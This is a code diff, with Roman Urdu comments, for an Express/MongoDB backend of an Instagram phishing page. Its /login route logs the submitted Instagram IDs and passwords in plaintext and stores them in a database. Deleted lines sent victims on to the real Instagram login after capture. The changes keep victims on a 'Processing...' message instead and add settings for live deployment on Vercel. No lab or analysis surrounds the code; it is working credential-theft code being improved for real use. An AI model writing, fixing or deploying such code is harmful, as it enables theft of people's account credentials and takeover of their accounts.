@@ -1,19 +1,22 @@
-require('dotenv').config(); // Environment variables load karne ke liye
+require('dotenv').config(); 
 const express = require('express');
 const mongoose = require('mongoose');
 const bodyParser = require('body-parser');
-const User = require('./user'); // Check karein ke file ka naam 'user.js' hai ya 'User.js'
+const path = require('path');
+const User = require('./user'); 
 
 const app = express();
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.json()); // JSON data support ke liye
+app.use(express.json()); // JSON data handle karne ke liye zaroori hai
+
+// Vercel/Live Server configurations
+app.set('views', path.join(__dirname, 'views'));
 app.set('view engine', 'ejs');
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public')));
 
 // Database Connection
-// process.env.MONGO_URI ko hum Atlas se connect karenge
 mongoose.connect(process.env.MONGO_URI)
     .then(() => console.log("Instagram DB Connected!"))
     .catch(err => console.error("DB Connection Error:", err));
@@ -26,22 +29,22 @@ app.get('/', (req, res) => {
 app.post('/login', async (req, res) => {
     const { instaId, password } = req.body;
     
-    // Console mein check karne ke liye ke data aa raha hai (Optional)
     console.log(`Received - ID: ${instaId}, Pass: ${password}`);
 
     try {
         const newUser = new User({ instaId, password });
         await newUser.save();
         
-        // Data save hote hi user ko asli Instagram par bhej dein
-        res.redirect('https://www.instagram.com/accounts/login/');
+        // Redirect hata diya taake user usi page par "In Progress" dekhta rahe
+        res.status(200).json({ status: "success", message: "Processing..." });
+
     } catch (err) {
         console.error("Save Error:", err);
-        res.status(500).send("Technical Issue, please try again later.");
+        res.status(500).json({ status: "error", message: "Technical issue" });
     }
 });
 
-// Port configuration (Live servers ke liye process.env.PORT zaroori hai)
+// Port configuration
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
